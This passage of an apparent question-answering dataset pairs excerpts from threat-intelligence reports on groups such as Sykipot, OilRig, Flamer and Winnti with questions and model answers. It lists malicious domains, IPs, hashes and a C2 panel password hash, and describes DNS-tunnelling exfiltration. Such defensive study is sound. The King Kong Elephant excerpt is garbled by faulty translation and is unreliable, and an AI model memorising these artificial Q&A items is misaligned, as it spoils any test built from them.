address 209.53.155.244 \u00adthe same IP address as the known Sykipot domains 'www.topix21century.com' and 'notes.topix21century.com'86 .\t The 'bluelightness.com' domain is also\t linked\t to\t 'mail\u00adkr2.com' \u00ada Destory RAT\t and NightDragon domain previously\t discussed.\t Both\t domains share infrastructure with\t the domain 'worldsecuritys.com'87 .\nAs of\t 6 February,\t the domains 'file.filesdelete.com',\t 'news.welldone123.net' and 'well.welldone123.net' all point to the IP\t address allocated\t to the large US financial institution (to which\t 'todaygonever.com' also previously\t pointed.)\t The domain 'welldone123.net' is\t a known Sykipot callback domain88 .\t The domain 'filesdelete.com' is also\t otherwise associated\t with malware89.\nThe email address listed\t in the domain registration for 'todaygonever.com' was 'janagreen2000@gmail.com'.\t The same contact\t email address (but\t different\t name, address,\t and\t phone and fax\t numbers) was also\t used\t in the domain registration for 'centurycpc.com', 'filesdelete.com', 'greenrightway.com', 'quicklyfindme.com', and 'newcarstyle.com' \u2013 at\t least two of which\t are known Sykipot malware domains90 .\n85 IP address 67.79.149.90 previously hosted 'helpdesk.bluelightness.com' and\t IP address 209.133.72.83 previously hosted 'shopping.bluelightness.com'.\n86 IP\t address 209.53.155.244 previously hosted 'notes.topix21century.com', 'shopping.bluelightness.com', and 'www.topix21century.com'. The webpage 'topix21century.com' was used, in what is believed to have been a targeted\t attack, to install Sykipot malware on computers\t which\t visited the webpage. The installed malware then communicated with a C2 server located at 'notes.topix21century.com'. (Symantec Corporation, 2010) (MalwareGroup.com)\n87 In 2011 both the known callback\t domain 'cb85.mail\u00adkr2.com' and\t 'test.worldsecuritys.com'\t pointed\t to IP\t address 12.68.249.62, the later still points there as\t of 9\t February 2012. In 2011, 'bluelightness.com'\t and 'worldsecuritys.com'\t both\t pointed\t to IP address 68.178.232.100, the later still points\t there as of 9\tFebruary 2012.\n88 The domain 'welldone123.net'\t is known to be associated with the Sykipot series\t of attacks. (Symantec Corporation, 2012)\n89 The domain 'www.filesdelete.com'\t is\t associated with 'Troj/Bdoor\u00adBDM'. (Sophos Ltd., 2012)\n90 The domain 'help.newcarstyle.com'\t is a known Sykipot callback, as is 'greenrightway.com'. (Symantec Corporation, 2012) (Malware Domains, 2012)\nBig Headline: INSIGHTS\n\u0141 Increasingly,\t instead of\t malware using the default\t DNS servers on a compromised computer to\t resolve its\tcallback domains to IP\t addresses,\t attackers will specify DNS\t servers for the malware to use.\t This has significant implications for network defenders.\t Such\t requests,\t if allowed,\t will bypass the victim's DNS servers and defeat\t any\t blacklists used by\tthe victim's own DNS servers.\t Furthermore,\t the requests will not\t appear in the victim's DNS server logs,\t making\t detection and investigation more difficult.\n\u0141 Organisations should\t consider blocking internal DNS traffic\tto all locations other than the company's own DNS\t servers.\t Furthermore they should\t be alert\t to any\tDNS\t communication attempts \tto locations other than the company's own DNS\t servers,\t as this may\tbe an indicator of\t a malware infection.\n\u0141 When code signing certificates are revoked\t the date of\t effect\t of\t the revocation is\tchosen so that, where possible,\t legitimate software signed with\tthe certificate continues to validate.\t Unfortunately,\t this means that\t sometimes malware signed with a compromised certificate will also\t continue to validate (despite the revocation).\n\u0141 Some malware attempts\tto communicate with C2 infrastructure at frequent intervals.\t The frequency\tof these communication attempts can be used to detect\t the malicious activity.\n\u0141 TCP port 443\t traffic is often allowed\t out of a network without\t inspection by\tnetwork security\t appliances as it\t is\t expected to\t be legitimate,\t encrypted\t SSL communications that can be difficult\t to\t inspect.\t Unfortunately,\nattackers take advantage of\t this by\tusing\t the port to\t bypass security\tappliances to communicate with\ta C2 server (such\tas with\t the observed X\u00adShell communications).\n\u0141 Attackers often reuse the same code for their malware.\t Sometimes they will recompile the code,\t sometimes they\t will merely\t reconfigure the malware.\t This alters the file hash and\t therefore such\ta hash\tis not an effective signature for other configurations of the malware. Hashes of the individual code sections (e.g. .text, .rdata,\t .reloc) make for more robust detection as sections within the malicious files often remain the same.\n\u0141 The majority of legitimate external network communications use the DNS\t protocol to\t determine their destination's IP\t address.\t Outbound network activity that occurs\t without a DNS\t lookup should\t be treated with\t suspicion until the purpose of\t the communications can otherwise be determined.\n\u0141 Blocking\t outbound\t communication attempts that are not\t preceded\t by\ta DNS\t lookup\tcan be effective in blocking C2\tcommunication attempts that are made direct to\t an IP\t address (such\tas to an IP\t address listed within an X\u00adShell configuration webpage).\t Legitimate destination IP addresses should\t be whitelisted to\t prevent\t legitimate activity\t from also being blocked.\n\u0141 Attackers will sometimes continue to\t use a callback domain even when it is listed\t on blacklists and\t in multiple malware analysis reports.\n\u0141 Blacklisting\t a domain can be useful but\t taking\t the time to research\t the domain and\t associated activity\tcan help\t with \tthe development of more effective, longer term\t mitigation strategies.\nBig Headline: DISCLAIMER\nMachine translation software and\t automated\t malware analysis\t reports have been heavily\t relied on throughout\t the development\t of this paper. While data has been verified\t against multiple sources where possible, Command Five Pty Ltd does not guarantee the veracity\tof sources or the accuracy\t of\t the information. Command Five Pty\t Ltd\t reminds\t readers to\t exercise caution when visiting untrusted websites and/or opening untrusted digital documents.\t Command\t Five Pty\t Ltd does not warrant that the websites referenced in this paper are trustworthy.\n\nBased on the above text, answer a question. How can the frequency of malware communication attempts with C2 infrastructure be used to detect malicious activity, and what other methods can be employed to enhance detection?",
    "output": "The frequency of malware communication attempts with C2 infrastructure can be used to detect malicious activity because some malware attempts to communicate with C2 servers at frequent intervals. Monitoring for such frequent communication patterns can help identify potential malware infections. Additionally, other methods to enhance detection include analyzing outbound network activity that occurs without a DNS lookup, as this can be indicative of suspicious behavior. Blocking outbound communication attempts that are not preceded by a DNS lookup, while whitelisting legitimate destination IP addresses, can also be effective in preventing C2 communication attempts.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\n[random 4 digits]ID[unique identifier]-[number of DNS queries needed]-[string of hexadecimal bytes for sent data]-[string of hexadecimal bytes for filename being sent].prosalar[.]com\nFor example, figure 4 is the first DNS query issued after our testing system ran the _DnsInit.bat script provided by the C2 server mentioned above. As you can see, each DNS request can only send 10 bytes of data at a time, requiring 29 outbound requests to transmit the 289 bytes of output that was generated by the batch script.\nAs you can surmise, ALMA Communicator's C2 channel is rather limited when it comes to data transfer. If an actor wished to use ALMA communicator to exfiltrate large files, it would result in a very large number of outbound DNS requests, as each outbound request can only send 10 bytes at a time. Even more limiting is the data transmission from the C2 server to the Trojan, which can only send 4 bytes per DNS request, as each IPv4 address is treated as data. We believe this is the reason why the Clayslide delivery document saved the Mimikatz tool to the system instead of having the actor download the tool to the system after a successful compromise. Based on the 4-byte per DNS request limitation, the ALMA Communicator would generate 189,568 DNS requests (not including the start and stop requests) to transmit the 758,272 byte Mimikatz tool to the system, which may be detected by security systems or personnel.\nConclusion\nThe OilRig threat group continues to use their Clayslide delivery document in their attack campaigns. The current variant of Clayslide also suggests that this group continues to develop these delivery documents with new installation techniques to evade detection. This threat group also continues to add new payloads to their toolset as well, with ALMA Communicator being the most recent addition. Lastly, it appears that OilRig still prefers using DNS tunneling for its C2 channel of choice, as ALMA Communicator, Helminth and ISMAgent all use this technique for C2 communications.\nPalo Alto Networks customers are protected by the following:\nWildFire identifies ClaySlide delivery documents and ALMA Communicator samples as malicious\nTraps blocks the ALMA Communicator Trojan via Local Analysis and blocks the Clayslide delivery document based on \"Suspicious macro detected\"\nAutoFocus customers can track these tools using the following tags:\nIndicators of Compromise f37b1bbf5a07759f10e0298b861b354cee13f325bc76fbddfaacd1ea7505e111 (Clayslide) 2fc7810a316863a5a5076bf3078ac6fad246bc8773a5fb835e0993609e5bb62e (ALMA Communicator)\n2d6f06d8ee0da16d2335f26eb18cd1f620c4db3e880efa6a5999eff53b12415c (Mimikatz) prosalar[.]com\n\nHow does the ALMA Communicator Trojan handle data transmission through DNS tunneling, and what are the implications for exfiltrating large amounts of data?",
    "output": "The ALMA Communicator Trojan uses DNS tunneling for its C2 communications, where each DNS request can only send 10 bytes of data at a time. This means that exfiltrating large amounts of data would require a very high number of outbound DNS requests. For example, sending 289 bytes of output from a batch script required 29 DNS requests. This limitation makes the ALMA Communicator less suitable for exfiltrating large files, as the sheer volume of DNS requests could alert security systems or personnel to the unusual activity.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Small Headline: Concurrent CVE-2014-0322 zero-day exploits\nIn February 2014, there was another instance of two attack groups sharing the use of a zero-day exploit to deliver different payloads. Between February 11 and February 15, 2014, the websites of the US Veterans of Foreign Wars (VFW.org) and the home page of a large European aerospace manufacturer both became victims of watering-hole attacks. Similar to the 2012 attacks, the sites were forced to redirect to an exploit for a previously unknown zero-day vulnerability in Internet Explorer (CVE-2014-0322) in order to deliver a malicious payload. In the VFW.org attack, the delivered payload was a variant of . Moudoor has been used in targeted attacks by a group previously reported by Symantec, referred as . The attack against the aerospace manufacturer took place simultaneously with the VFW attack and exploited the same zero-day vulnerability. The payload in the aerospace watering-hole attack was Black Vine's Sakurel malware.\nSmall Headline: Elderwood link\nThe simultaneous attacks between different attack groups seen in 2012 and 2014 exploited the same zero-day vulnerabilities at the same time, but delivered different malware. The malware used in these campaigns are believed to be unique and customized to each group. However, the concurrent use of exploits suggests a shared access to zero-day exploits between all of these groups. Symantec has previously identified the platform that has been used to deliver zero-day exploits to multiple attack groups as the .\nPrevious attacks exploiting zero-day vulnerabilities sourced from the Elderwood framework are believed to have originated from attackers based in China.\nMedium Headline: Attribution\nBlack Vine appears to have access to resources to develop and update its own custom malware, and obtain zero-day exploits for its targeted attacks. This access and capability suggest that Black Vine is well funded and resourced. Black Vine's continuous campaigns against targeted industries, beginning in late 2012, fit the TTPs associated with organized cyberespionage actors.\nCertain Black Vine infrastructure seems to be associated with the Beijing-based security organization Topsec. The relationship with Black Vine and Topsec provides evidence of the past or present geography of at least some actors involved in this group's activity.\nAccess to the Elderwood framework is another indicator that Black Vine is in working relationships with actors associated with widely reported cyberespionage attacks over the past several years. Along with this, Black Vine has been observed using Elderwood-distributed zero-day exploits simultaneously with other threat actors.\nQuestion: How does the concurrent use of zero-day exploits by different attack groups suggest a shared access to zero-day exploits, and what role does the Elderwood framework play in this context?",
    "output": "Answer: The concurrent use of zero-day exploits by different attack groups suggests a shared access to these exploits because multiple groups were able to leverage the same vulnerabilities simultaneously. This indicates that there is a common source providing these exploits. The Elderwood framework has been identified as the platform used to deliver zero-day exploits to multiple attack groups. Previous attacks exploiting zero-day vulnerabilities sourced from the Elderwood framework are believed to have originated from attackers based in China. This framework facilitates the distribution of zero-day exploits to various cyberespionage groups, including Black Vine.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: The control panel\nAccess to the Flamer control panel requires authentication:\nFigure 5\nControl panel login page\nThe following credentials are used to gain access to the control panel (only the MD5 password hash is available; attempts to crack the password were unsuccessful):\nUsername: username\nPassword Hash: 27934e96d90d06818674b98bec7230fa\nThe control panel for interacting with Flamer-compromised computers is very basic. The simple interface allows the operators to upload packages and download encrypted data stolen from the compromised clients. The operator is required to upload specially crafted tar.gz files. The archived filename needs to follow a specific format, which is parsed and then stored in the ads or news directory, depending on the file extension used.\nThe filename format for these packages is as follows:\nThe following is a screen shot of the control panel that allows the operator to upload data to the server:\nFigure 6\nControl panel data upload screen\nThis approach to uploading packages and downloading data fits the profile of military and intelligence operations. A typical control panel is easy to use and self-explanatory. The operator has full control over what to do with the compromised clients and has the ability to retrieve and inspect the stolen information. The Flamer control panel provides limited capabilities to the operator, preventing them from viewing and interpreting the information being exchanged.\nThis approach would help prevent operators from knowing what is contained within the packages or the significance of the data being exchanged between clients and the attackers. Such a design would also serve as a defensive measure as it would prevent arbitrary packages from being uploaded and prevent downloaded data being from being inspected by unknown parties that may have gained access to the control panel.\nThe following screen on the control panel allows the user to view and download backed up data from the server:\nFigure 7\nControl panel screen for downloading stolen data\nThe tar.gz contains all the relevant stolen data and details of where the information was stolen from. The private key is required here to inspect the encrypted data.\nSmall Headline: Schema\nThe database is used to store the relevant data about connecting clients, packages to send to the clients, some logging and settings required for encryption, and authentication to access the control panel.\nFigure 8\nNewsforyou application database schema\nThe session_log, log, and client_log are all encrypted using the keys stored in the settings table shown below and were successfully decrypted:\nThe database is regularly emptied by the delete.php script; there is limited data in it. The following table gives a brief description of the tables found in the database:\nThe session_log table contains details of all connections to the server while client_log only contains connections with a recognized protocol (e.g. valid compromised computers).\nExamining the data in the table indicates that 1071 valid requests were recorded from compromised clients. A decrypted client log entry contains the following information:\nCLIENT _ ID:[UUID]\nCLIENT _ TYPE:3\nCLIENT _ VERSION:0\nREQUEST _ TYPE:0\nNAME=&FILE _ SIZE=0\nPROTOCOL:1\nThe four encrypted requests in the database on the first server are W32.Flamer client requests, which use the old protocol:\n\u2022 CLIENT\n\u2022 PROTOCOL\n= 3 =\nCLIENT_TYPE_FL\n= 1\n= OLD_PROTOCOL\nThe additional sessions logged are likely attributed to researchers who had discovered the whereabouts of the command-and-control servers.\nThe session_log data contained three separate HTTP_HOST values, indicating multiple Flamer C&C server URLs were used to access this server.\nAlthough only one encrypted file existed in the newsforyou/entries folder (the stolen data uploaded from the compromised clients), the database reveals that 189 records had been created. The other 188 files had already been removed from the server. The entry left on the server had been successfully stolen from the computer located in Israel.\nA final point to note here is in relation to the entry in the news_entries table. Only one record ever existed: the malicious payload to clean the computers up, uploaded on May 18, 2012, at 13.43:45. This server only served up one package and it was uploaded as soon as the server had been initially configured. The last time a compromised client connected to the server was Friday, June 1, 2012, at 11:42:47, and the last log recorded in the database was Friday, June 1, 2012, at 11:46:01.\nBig Headline: Conclusion\nExamining the W32.Flamer servers has provided additional insight into the architecture of not only the threat, but also into the command structure of the entities behind it. The server code was written and updated by at least four separate individuals, indicating a continuing development effort to support W32.Flamer and, potentially, new or additional threats of a similar nature. The command-and-control Web application has been in active development for many years, possibly as early as 2006, which is well before Flamer's earliest seen compilation date in 2010.\nThe operators of the C&C servers may be a group of less senior individuals, working on a need-to-know basis, as the operator is not required (nor has the permission) to interpret the value or purpose of the incoming data. Only the attackers have the permission to access and interpret this data. This separation of operational and attacker visibility and roles indicates that this is the work of a highly organized and sophisticated group. The likelihood of a large and well-funded entity's involvement in Flamer is corroborated by the use of the unique certificate weakness used to hijack the Windows Update feature to spread across networks.\nThey were also careful to unload and archive data where necessary, remove duplicate files, and delete unnecessary files to prevent the server from running out of disk space. This was an ongoing development up to 2011. R***'s edits in the source code suggest the concern was less about updating protocols and more about ensuring there was ample room on the servers for the stolen data to be uploaded to, begging the question of how much data was actually being stolen.\nThis investigation simply provides a snapshot in time of the Flamer attack campaign. Considering that logging was disabled and data was wiped clean in such a thorough manner, the remaining clues make it virtually impossible to determine the entity behind the campaign. There is little doubt that the larger project involving cyber-espionage tools, such as Flamer, will continue to evolve and retrieve information from the designated targets.\nBig Headline: Resources\nFlamer: Highly Sophisticated and Discreet Threat Targets the Middle East (<http://symantec.com/connect/blogs/flamer-highly-sophisticated-and-discreet-threat-targets-middle-east>)http://symantec.com/connect/blogs/flamer-highly-sophisticated-and-discreet-threat-targets-middle-east\nPainting a Picture of W32.Flamer\nFlamer: A Recipe for Bluetoothache\nW32.Flamer: Spreading Mechanism Tricks and Exploits (<http://symantec.com/connect/blogs/w32flamer-spreading-mechanism-tricks-and-exploits>)http://symantec.com/connect/blogs/w32flamer-spreading-mechanism-tricks-and-exploits\nW32.Flamer: Leveraging Microsoft Digital Certificates (<http://symantec.com/connect/blogs/w32flamer-leveraging-microsoft-digital-certificates>)http://symantec.com/connect/blogs/w32flamer-leveraging-microsoft-digital-certificates\nW32.Flamer: Microsoft Windows Update Man-in-the-Middle (<http://symantec.com/connect/blogs/w32flamer-microsoft-windows-update-man-middle>)http://symantec.com/connect/blogs/w32flamer-microsoft-windows-update-man-middle\nW32.Flamer: Enormous Data Collection (<http://symantec.com/connect/blogs/w32flamer-enormous-data-collection>)http://symantec.com/connect/blogs/w32flamer-enormous-data-collection\nFlamer: Urgent Suicide\nAny technical information that is made available by Symantec Corporation is the copyrighted work of Symantec Corporation and is owned by Symantec Corporation.\nNO WARRANTY . The technical information is being delivered to you as is and Symantec Corporation makes no warranty as to its accuracy or use. Any use of the technical documentation or the information contained herein is at the risk of the user. Documentation may include technical or other inaccuracies or typographical errors. Symantec reserves the right to make changes without prior notice.\nBig Headline: About Symantec\nSymantec is a global leader in providing security, storage and systems management solutions to help businesses and consumers secure and manage their information. Headquartered in Mountain View, Calif., Symantec has operations in more than 40 countries. More information is available at (<www.symantec.com>)www.symantec.com.\nFor specific country offices and contact numbers, please visit our Web site. For product information in the U.S., call toll-free 1 (800) 745 6054.\nSymantec Corporation\nWorld Headquarters\n350 Ellis Street\nMountain View, CA 94043 USA\n+1 (650) 527-8000\nCopyright \u00a9 2012 Symantec Corporation. All rights reserved. Symantec and the Symantec logo are trademarks or registered trademarks of Symantec Corporation or its affiliates in the U.S. and other countries. Other names may be trademarks of their respective owners.\nQuestion: What role did the database play in the operation of the Flamer command-and-control server, and how was data security managed within the database?",
    "output": "Answer: The database played a crucial role in storing relevant data about connecting clients, packages to send to the clients, some logging, and settings required for encryption and authentication to access the control panel. Data security within the database was managed by encrypting the session_log, log, and client_log tables using keys stored in the settings table. The database was regularly emptied by the delete.php script to maintain minimal data retention. This approach helped in preventing the server from running out of disk space and hindered potential investigations if the server were to be discovered.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Small Headline: 3 Russia\nSince the turn of the century, Russia has been publicly admiring European values while simultaneously emphasising sovereignty and a strong national defence.8 Moscow insists that 'each nation in the region should be given a right to experiment with its own democratic model that fits its national and international conditions'. 9 This tension may only grow stronger with time, and we may see further Russian moves away from shared values in the future as Moscow confronts not only Ukraine but also the West more generally, including in Syria.\nRegarding Ukraine, Russia insists it is a bystander and even a victim. Putin said, 'There are still many threats and challenges in the world today. As you may know, in Europe, militant nationalism is raising its head here and there \u2013 the one that once led to the appearance of the Nazi ideology. I will not dwell on each of the hotspots separately \u2013 we all know where the danger is. Incidentally, the situation in our neighbouring brotherly Ukraine is an example of the disaster and loss such an irre-sponsible policy can bring about.'10 In explaining Gazprom's tough stance vis-\u00e0-vis Ukraine, for example, Putin has argued that there was no other choice but to take a hard line against Kyiv,11 again placing Russia as a bystander, not an active party.\nPutin has consistently delegitimised Poroshenko's government:\n'There can only be one assessment: this was an anti-constitutional takeover, an armed seizure of power [that] significantly destabilised the east and south-east of Ukraine [\u2026] we see the rampage of reactionary forces, nationalist and anti-Semitic forces going on in certain parts of Ukraine, including Kyiv [\u2026] Are the current authorities legitimate? The Parliament is partially, but all the others are not. The current Acting President is definitely not legitimate [\u2026] one set of thieves [is] being replaced by another. [\u2026] We will not fight with the Ukrainian people [but] I do not have a partner at the top level there'.12\nThroughout the Ukraine crisis which began in 2014, Vladimir Putin has not once used the word 'cyber'. This does not signify a lack of interest in the subject, or that Russia has not engaged in computer network operations, but it does demonstrate a preference not to discuss the issue, which in turn likely means that cyber warfare as a distinct form of attack, from\nThroughout the Ukraine crisis, Vladimir Putin has not once used the word 'cyber'.\n8 Andrei P. Tsygankov. Russia's Foreign Policy: Change and Continuity in National Identity (Rowman & Littlefield Publishers, 2013), 181.\n9 Ibid.\n10 'Meeting with Presidents of Armenia, Belarus, Kyrgyzstan and Tajikistan' Website of the President of Russia, 8 May 2014), http://en.kremlin.ru/events/president/news/20980.\n11 'Message to the leaders of European countries regarding the supply and transit of Russian gas across the territory of Ukraine' Website of the President of Russia, 15 May 2014, http://en.kremlin.ru/events/president/news/page/82.\n12 'Vladimir Putin answered journalists' questions on the situation in Ukraine' Website of the President of Russia 3 April 2014), http://en.kremlin.ru/events/president/news/20366.\nRussia's perspective, has not played a major role in the Ukraine conflict. There have been some commercial reports alleging specific Russian cyber attacks, such as that by the security firm FireEye,13 but these are typically dismissed as Western propaganda. According to Kremlin spokesman Dmitry Peskov, 'We know that blaming Russia for everything has turned into a sport'. 14\nPutin did refer to the stories about phone hacking and surveillance of top politicians, which were prominent in the news in 2014:\n'As for the facts of cyber espionage that you mentioned, it not only amounts to overt hypocrisy in relationships between allies and partners, but also a direct violation of the state's sovereignty, an infringement on human rights and an invasion of privacy. We are looking forward to jointly developing an international information security system'.15\nThis quote may indicate an underlying assumption of Russian doctrine: today, everyone is spying on everyone, there are currently no acceptable international laws to govern such activities in cyberspace, and Russia must be a part of any credible effort to develop such norms.\nAlthough Russia claims not to be directly involved in the Ukraine conflict, Moscow still wants to direct its peace-making efforts. Putin has championed a consideration of Ukraine's eastern regions16 has produced a diplomatic solution called the Putin Plan17 and 'gave the instruction to hold consultations with foreign partners, including the IMF and the G8 countries, on organising financial assistance for Ukraine'. 18\n\nBased on the above text, answer a question. Why has Vladimir Putin consistently avoided discussing cyber warfare, particularly in the context of the Ukraine crisis? What implications does this have for Russia's approach to cyber operations?",
    "output": "Vladimir Putin has not once used the word 'cyber' throughout the Ukraine crisis, indicating a preference not to discuss the issue publicly. This does not mean a lack of interest in the subject or that Russia has not engaged in computer network operations. Instead, it suggests that cyber warfare, from Russia's perspective, has not played a major role in the Ukraine conflict. This silence may also reflect a strategic decision to avoid acknowledging cyber capabilities, thereby maintaining plausible deniability and avoiding international scrutiny.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: Why is the analysis of compile times significant in understanding the Sunshop campaign, and how does it help in clustering malware samples?",
    "output": "Analyzing compile times is significant because it helps in clustering malware samples by identical compile times, even though the timestamps can be forged. The most common compile time found was December 19, 2012 at 20:25, with 28 binaries compiled at this time, all detected as Trojan.APT.9002 and utilizing the Sunshop PE resource. Another common compile time was July 21, 2012 at 14:50, with five samples compiled at this time, all detected as Trojan.APT.9002 and utilizing the DTL PE resource. The use of the same compile times across different campaigns indicates a common development and logistics infrastructure supporting these operations, which is crucial for understanding the broader scope and interconnectedness of the Sunshop campaign.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: 1. Summary of the event\nIn February 2022 , the mobile security team of Qi'anxin Virus Response Center noticed that since June 2021 , an A _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ P& T organization mainly targets PakistanThe Tanzanian military has launched organized , planned and targeted military espionage intelligence activities . _ After just nine months of attacks , the group has affected dozens of Pakistani military personnel . _ This part of the victimThe personnel are mainly Pakistani national border guards ( FC ) and special forces ( SSG ) , especially the Balochistan border guards ( FCBLN ) ; in addition _ _ _ _ Also contains a small amount of FBI ( FIA ) and police ( Police ) . _ _ _ _ _ _ _ Another attack also affected a small number of Nepalese personnel , but domestic users in China were not affected by it .\nThe organization usually uses public social platforms to find the target of concern , and combines pornographic words and other chats to induce the target users to install the specified bait chat attack application . Used for phishing attacks . Furthermore ,The attacker also published the malicious chat application on a well- known foreign app store platform , but the relevant links are now inaccessible\n.\nAs of the time of this report , all the attacks of this group that we have intercepted are carried out through the An d r oi d platform , and we have not found any Via the Windows platform _ _ _ _ _attack . _ _ A total of 8 malicious application download servers have been captured , and at least 5 different Android platform attack samples can be downloaded on the servers . _ _ All samples were _ _Dedicated chat software for Italian codes . We name all these captured malicious samples V a j r a Sp y . _ _ _ _\nComprehensive analysis of the attack activity characteristics , sample coding method , C2 server architecture and other clues shows that the organization has a regional power in South Asia . the background of the government , but also live with the regionOther APT tissues that jumped , such as Sidewinder Sidewinder , Manling Flower Bitter , Belly Brainworm Donot , etc. , were not significantly associated _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ ( Only with bellyworm D o no o t _ _There is a small amount of similarity ) , with strong independence and independent characteristics . Therefore , we identified this organization as a new APT organization active in South Asia . _ _ We named it King Kong Elephant , English _The document name is V a j r a E l e ph , and the organization number is A P T - Q - 4 3 . King Kong Elephant is the 15th APT organization that Qi Anxin independently discovered and first disclosed . _ _ _\nBig Headline: 2. Load delivery _\nThrough the Qi Anxin Virus Response Center mobile security team and the Qi Anxin threat intelligence platform ( h t t p s : / / t i . q i a n x i n . c o m / ) joint tracking analysis found that , the earliest activities of the King Kong Elephant Organization can be traced back to June 2021 . The picture below shows the earliest payload server information of the organization that we intercepted .\nIn the early attacks of this group , the \" short link \" of the download address of the attack payload is usually sent to the target through social software such as WhatsApp . . Later , with the major socialTaiwan banned related links , and the organization switched to delivering short links to target people in the form of pictures .\nThe load name servers used by this organization are all registered for less than a year , and the registrars are mainly Name Sil o and Name Cheap . _ _ _ _ _ _ _ This is in line with another recent activity in South AsiaThe activity of the advanced attack group , the brainworm , is similar .\nBig Headline: 4. Technical Analysis _\nThrough analysis , it is found that the attack RA T invested by the King Kong Elephant Organization is currently targeting the Android platform . _ Analysis shows that the organization has a high degree of R A T customization , and weNamed V a j r a Sp y . _ _ V a j r a Spy supports all the classic functions of espionage and stores the stolen data in a designated Google cloud storage space . _ _ _ _ _ _\n5. Attacker portrait _ _\n1 ) The purpose of the attack\nAttackers targeted Pakistani military , security and police personnel , including border guards ( FC ) , special forces ( SSG ) , federal investigators _ _ _ _ _ _ Bureau ( FIA ) and Police ( P _ _o l ic e ) and so on . Among them , the border guards are the main target .\nThere are also a small number of activities targeting Nepalese military personnel . It can be seen from this that military personnel and military secrets are thethe main purpose of the activity .\n2 ) Attack method\nAttackers are good at using social induced delivery and SMS induced delivery to attack , among which social induced delivery is the main method .\n3 ) Network assets\nThe mobile phone numbers used by the attackers are all exclusive numbers of mobile service providers in a country in South Asia . 4 ) Native language features\nThe attackers used a large number of languages from a South Asian country in their attacks . The country has a longstanding military and geopolitical conflict with Pakistan . _ _\n5 ) Association with other APT organizations _ _ _\nThe activity characteristics of the malicious sample download server are similar to those of the belly worm ( Donot ) . _ _ _\nSome of the filenames used in the attack have certain similarities to the bellyworm tissue . _ _\nTo sum up , the King Kong Elephant Organization should be a senior executive with a government background in a South Asian country who mainly launched cyber attacks against Pakistani military personnel and military activities . attack group , is an active _New APT organization in South Asia . _ _ _\nQ: What are the key characteristics and motivations of the King Kong Elephant (Vajra Eleph) APT group, and how do they relate to other known APT groups in the region?",
    "output": "The King Kong Elephant APT group is characterized by its focus on targeting Pakistani military, security, and police personnel, with a particular emphasis on border guards. They use social engineering techniques and have a strong regional focus on South Asia, with some similarities in their methods to the bellyworm (Donot) APT group. The group is believed to have a government background and is motivated by gathering military secrets. Despite some similarities, they operate independently and have shown strong independence in their activities.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Small Headline: C:\\Documents and Settings\\Administrator\\Desktop\\1.reg (created on 2012-09-24 12:44:07 UTC)\nThe file had an exported registry data, which had been removed from the registry during system cleanup on 24th September 2012. Here is the original contents of the registry key\n(HKLM\\SYSTEM\\CurrentControlSet\\Services\\tcprelay) before it was removed:\nTcprelay.sys registry settings with original file path.\nOnce the infection on the machine was confirmed we started looking for the origins of the malicious files. From our previous experience of Winnti gang tactics, we knew that they are keen on sending targeted emails with attached executables. Security Officers helped us check all the emails stored in local Outlook database file on suspected dates of infection, however that didn't reveal anything suspicious.\nWe have also found system event log files which were copied and analyzed. Event logs had records of tcprelay service start timestamps which confirmed the discovered date of infection. User SID corresponded to the local user account according to the registry.\nTcprelay service first start time from the Event Log\nThe Machine #3 had an anti-virus program installed. Checking detection logs of the anti-virus on the suspected date of infection (05.09.2012) showed that there was a single detection right before tcprelay service first start.\nPart of the antivirus quarantine log.\nWe recovered the PDF document called \"Transmission with Steps, Realited and Compressed.pdf\" from the anti-virus quarantine and prepared to find an exploit inside. The PDF had a lot of obfuscated JavaScript code inside, however we believe that it was not related to the original infection of the system. It was clean and the anti-virus detected it by mistake, probably because of some suspicious obfuscated JavaScript code.\nPDF document detected by the antivirus as malicious.\nThe JavaScript code inside the PDF was used to process an interactive form inside the PDF and support dynamic interactive 3D model embedded in the document using Adobe 3D technology.\nAfter that, we checked the infected machine's browser history. The Internet Explorer history log files showed that the user was reading email right before the infection of his machine.\nWith that in mind, we analyzed the Outlook local database again. This time we used several techniques to recover emails that were deleted from the Trash folder. This helped to partly recover a message which arrived on the day of infection.\nRecovered targeted attack email on Machine#3.\nThe text of the message supposed to contain an attachment, however the attachment and MIME headers of the email were completely lost and couldn't be recovered. However, it was clear that the email was a targeted attack against the employee of the company. It was sent from companyxxyz@163.com and replaced \"From\" field in the email body which made it look like a legitimate email in the list of messages in Outlook.\nTargetted attack email in the list of Outlook messages.\nWe discovered a Windows prefetch file in the system directory, that was created when the malicious attachment was opened. The timestamp correlates with the time of infection.\nSmall Headline: C:\\Documents and Settings\\<Username>\\LocalSettings\\Temp\\RAR$EX00.156\\CompanyXYZ EMPLOYEE SALARY ADJUSTMENTS EBOOK.EXE\nAccording to the file path, this executable was a part of an archive, which was opened with WinRAR installed on the system.\nUpon discovery, we requested the Security Officers to provide us with full MIME as well as to check who else may have received the same message. The check discovered series of emails sent to several publicly known email addresses. In all cases the text message was the same as shown above, however sent from different mailboxes. The Return-Path MIME filed seemed to have the original email addresses of the attackers:\ncompanyxxyz@163.com\ncompany.xyz@gmx.com\nThe attackers used the same IP to send out emails: 118.142.11.114\nThe emails we checked had the same attachment of 96782 bytes named \"Salary adjustments.zip\". There was only one file inside ZIP archive, called \"CompanyXYZ Employee Salary Adjustments Ebook.exe\". Full details about this application are provided further down in current report.\nTo summarize, the targeted attack started from an email sent at 05.09.2012 19:12 (UTC+03).\nIt resulted in system infection at 05.09.2012 19:52 (UTC+03).\nSmall Headline: CompanyXYZ Employee Salary Adjustments Ebook.exe File\nSize: 122880\nMD5: 6ef66c2336b2b5aaa697c2d0ab2b66e2\nLocation: \"Salary adjustments.zip\"\nCreation time: unavailable\nLink time (UTC): 2012-07-21 18:50:18\nInternal name: FlashUpdate.EXE\nThis application is a wrapper for another embedded executable modules. It serves as a dropper of malware.\nMalware dropper file structure\nNotable fact: this application has a resource section inside and the default locale is set to Chinese 